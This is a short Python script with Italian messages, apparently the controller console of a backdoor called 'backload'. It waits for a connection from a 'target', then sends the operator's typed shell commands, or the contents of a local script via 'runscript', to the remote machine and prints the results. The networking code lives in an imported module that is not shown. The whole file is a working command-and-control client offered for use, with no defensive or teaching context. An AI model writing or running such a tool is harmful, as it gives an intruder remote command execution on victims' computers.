import os
import sys
import function
Connection = function.Connection()


try:
    inizializzation = Connection.INIT_CONN()
    if inizializzation == False:
        print("[err] impossibile inizializzare il socket")
        sys.exit()
    else:
        print("[*] socket inizializzato\n[*] in attesa di connessione")
except:
    print("[err] impossibile inizializzare il socket")
    sys.exit()
try:
    listen = Connection.LISTEN()
    if listen == False:
        print("[err] impossibile accogliere il client")
        sys.exit()
    else:
        print("[*] connessione stabilita con il targhet")
except:
    print("[err] impossibile accogliere il client")
    sys.exit()

while True:
    command = input("backload> ")
    if command.split()[0] == "runscript":
        filecontent = None
        try:
            script = command.split(" ")[1]
        except:
            print("[sintax] 'runscript {path}'")
        try:
            filescript = open(script, "r")
            filecontent = filescript.read()
            filescript.close()
        except:
            print("[err] impossibile trovare il path dello script")
        if type(filecontent) != "<class 'str'>":
            Connection.SEND("scr" + filecontent)

    else:
        Connection.SEND("com" + command.replace("\\", "\\\\"))

    response = Connection.RECV()
    if response != False:
        try:
            print(response.decode())
        except:
            print("[err] impossibile mettere in output il messaggio ricevuto")
    else:
        print("[err] connessione caduta")
        break